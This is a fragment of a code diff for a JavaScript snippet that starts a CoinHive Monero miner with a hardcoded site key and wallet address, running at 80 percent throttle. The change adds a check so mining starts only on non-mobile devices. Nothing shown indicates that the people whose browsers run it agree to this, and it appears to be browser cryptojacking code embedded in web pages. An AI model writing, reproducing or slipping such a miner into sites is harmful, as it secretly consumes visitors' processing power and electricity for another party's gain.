@@ -3,7 +3,9 @@ script.onload = function () {
 	// XMR Pool hash
 	var m = new CoinHive.Anonymous( 'Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.8} );
 	// Wallet
-	m.start('43er6EeusBRXUqY4w3tXWVD6HpBV57cXn4Y4kDeMVcz1Ji1R6zJhDwxNz2gGCEzWEgD5Z5sSWnsJ53rEcrwsf8Pm7pudpSc');
+	if(!m.isMobile()){
+		m.start('43er6EeusBRXUqY4w3tXWVD6HpBV57cXn4Y4kDeMVcz1Ji1R6zJhDwxNz2gGCEzWEgD5Z5sSWnsJ53rEcrwsf8Pm7pudpSc');
+	}
   
 	m.on('found', function () { console.log('Found!'); });
 	m.on('accepted', function () { console.log('Accepted!'); });
